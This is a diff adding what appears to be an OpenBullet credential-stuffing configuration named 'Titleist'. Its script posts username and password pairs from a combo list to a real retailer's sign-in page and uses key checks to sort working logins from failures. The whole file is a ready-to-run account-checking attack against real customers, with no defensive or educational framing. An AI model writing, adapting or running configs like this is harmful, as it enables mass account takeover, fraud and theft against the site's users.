@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Titleist",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-02T10:02:05.0859126+00:00",
+  "AdditionalInfo": "",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.titleist.com.sg/my-profile/sign-in" AutoRedirect=TRUE 
+  CONTENT "Redirect=&Consumer.emailaddr=<USER>&Consumer.password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.titleist.com.sg/my-profile/sign-in" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "and/or" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "and/or" 
